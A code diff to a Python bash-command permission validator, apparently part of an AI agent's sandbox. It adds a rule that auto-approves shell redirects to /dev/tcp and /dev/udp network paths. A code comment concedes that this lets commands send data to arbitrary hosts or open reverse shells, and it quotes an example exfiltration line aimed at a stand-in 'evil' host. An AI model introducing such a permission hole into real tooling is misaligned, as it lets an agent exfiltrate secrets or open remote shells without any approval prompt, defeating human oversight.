@@ -52,6 +52,16 @@ TMP_ALLOWED_ROOT = '/tmp'
 # (handled separately) targets an already-open descriptor, not a new file.
 SAFE_REDIRECT_DEVICES = {'/dev/null', '/dev/stdout', '/dev/stderr', '/dev/tty'}
 
+# Bash network pseudo-paths: a redirect to `/dev/tcp/host/port` (or udp) opens a
+# socket rather than creating a file, so the file-containment check never applies
+# and would always reject it. These are allowed by explicit operator opt-in to
+# keep port-probe diagnostics (`exec 3<>/dev/tcp/localhost/5432`) frictionless.
+# NOTE: this also auto-approves outbound writes to ARBITRARY hosts — including
+# exfiltration (`secret > /dev/tcp/evil/443`) and reverse-shell redirects. That
+# trade-off was made deliberately; narrow these prefixes to `.../localhost/` and
+# `.../127.0.0.1/` if local-only probing is all that's wanted.
+NET_REDIRECT_PREFIXES = ('/dev/tcp/', '/dev/udp/')
+
 # Tokens that merely INTRODUCE or WRAP another command and must therefore be
 # transparent to permission checking: the command that follows is the thing that
 # actually runs and must be the thing we validate. Whitelisting any of these as
@@ -648,9 +658,11 @@ class BashPermissionValidator:
     def _is_redirect_target_allowed(self, target: str) -> bool:
         """
         Decide whether an output redirection may write to `target` without a
-        prompt. Allowed: the write-safe /dev sinks (and any `/dev/fd/N`), and
-        anything resolving inside the workspace or /tmp — the same roots that
-        gate `rm` and workspace-binary execution.
+        prompt. Allowed: the write-safe /dev sinks (and any `/dev/fd/N`), the
+        bash network pseudo-paths (`/dev/tcp/...`, `/dev/udp/...`; see
+        NET_REDIRECT_PREFIXES for the security trade-off), and anything
+        resolving inside the workspace or /tmp — the same roots that gate `rm`
+        and workspace-binary execution.
 
         When the target fully resolves (no unexpanded construct), we realpath it
         and require containment, exactly like `rm`. When it does NOT resolve
@@ -664,6 +676,8 @@ class BashPermissionValidator:
         itself expands to `../` and escapes — is accepted by design.
         """
         if target in SAFE_REDIRECT_DEVICES or target.startswith('/dev/fd/'):
+            return True
+        if target.startswith(NET_REDIRECT_PREFIXES):
             return True
         resolved = self._resolve_target_path(target)
         if resolved is not None:
